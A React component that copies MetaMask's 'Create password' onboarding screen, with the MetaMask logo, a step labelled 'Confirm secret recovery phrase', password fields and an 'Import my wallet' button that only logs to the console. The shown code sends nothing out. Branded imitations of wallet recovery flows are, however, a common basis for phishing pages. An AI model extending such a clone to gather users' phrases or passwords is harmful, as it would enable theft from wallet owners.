import React, { useState } from "react";
import logo from "../assets/images/logo.png";

const CreatePassword = () => {
  const [agreed, setAgreed] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const handleWalletImport = () => {
    if (!agreed) return;
    console.log("Import my wallet clicked");
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center overflow-x-hidden"
      style={{ backgroundColor: "#141618", color: "var(--color-text-default)" }}
    >
      <nav className="h-16 flex items-center justify-between w-11/12 md:w-10/12">
        <div className="flex items-center space-x-2">
          <img src={logo} alt="MetaMask" className="h-6 w-auto" />
        </div>
        <select className="border border-gray-500 bg-[rgb(20,22,24)] text-white px-14 py-2 rounded-md">
          <option>English</option>
          <option>Spanish</option>
          <option>French</option>
        </select>
      </nav>

      <div className="flex-grow flex items-center justify-center p-4">
        <div className="relative w-full max-w-md rounded-xl p-6 md:p-4 pb-14 border border-zinc-800">
          <div className="flex items-center justify-center mb-6">
            <div className="relative w-full max-w-[350px] h-[40px]">
              <div className="absolute h-0.5 bg-custom top-2 left-20 right-20 -translate-y-1/2" />
              <div
                className="absolute flex flex-col items-center"
                style={{
                  left: 0,
                  top: "50%",
                  transform: "translateY(-50%)",
                }}
              >
                <div className="w-8 h-8 rounded-full border-2 border-[rgb(67,174,252)] bg-[rgb(67,174,252)] text-[#141618] font-bold flex items-center justify-center">
                  1
                </div>
                <p className="text-xs mt-1 text-[rgb(67,174,252)]">
                  Confirm secret recovery phrase
                </p>
              </div>
              <div
                className="absolute flex flex-col items-center"
                style={{
                  right: 25,
                  top: "50%",
                  transform: "translateY(-50%)",
                }}
              >
                <div className="w-8 h-8 rounded-full border-2 border-[rgb(67,174,252)] bg-[#141618] text-[rgb(67,174,252)] font-bold flex items-center justify-center">
                  2
                </div>
                <p className="text-xs mt-1 text-[rgb(67,174,252)]">
                  Create password
                </p>
              </div>
            </div>
          </div>

          <h2 className="text-xl md:text-2xl font-bold text-center mb-2 text-white">
            Create password
          </h2>
          <p className="text-center mb-4"
            style={{
                fontWeight: "1.rem"
            }}
          >
            This password will unlock your MetaMask wallet only on this device. MetaMask can not recover this password.
          </p>

          <div className="flex flex-col items-start w-full max-w-xs mx-auto mb-6 space-y-4">
            <div className="flex items-center justify-between w-full">
              <label
                htmlFor="newPassword"
                className="text-sm text-white"
              >
                New password (8 characters min)
              </label>
              <button
                type="button"
                className="text-sm text-[rgb(67,174,252)] focus:outline-none"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? "Hide" : "Show"}
              </button>
            </div>
            <input
              id="newPassword"
              type={showPassword ? "text" : "password"}
              className="w-full px-4 py-2 border border-gray-500 rounded-md bg-[#141618] text-white placeholder-gray-400 focus:outline-none focus:border-[rgb(67,174,252)]"
            />
            <label
              htmlFor="confirmPassword"
              className="text-sm text-white"
            >
              Confirm password
            </label>
            <input
              id="confirmPassword"
              type={showPassword ? "text" : "password"}
              className="w-full px-4 py-2 border border-gray-500 rounded-md bg-[#141618] text-white placeholder-gray-400 focus:outline-none focus:border-[rgb(67,174,252)]"
            />
          </div>

          <div className="agree-box flex items-center ml-6 mb-6 space-x-6">
            <input
              type="checkbox"
              checked={agreed}
              onChange={() => setAgreed(!agreed)}
              className="custom-checkbox-2"
              id="agree-terms"
            />
            <label htmlFor="agree-terms" className="text-xs text-gray-300 text-start ml-4">
              I understand that MetaMask cannot recover this password for me.
            </label>
          </div>

          <div className="flex flex-col items-center space-y-6">
            <button
              disabled={!agreed}
              className={`create-button py-3 text-sm rounded-full font-medium ${
                agreed
                  ? "bg-[#43AEFC] hover:bg-opacity-90 text-black"
                  : "bg-[#43AEFC] bg-opacity-40 text-black cursor-not-allowed"
              }`}
              onClick={handleWalletImport}
            >
              Import my wallet
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CreatePassword;
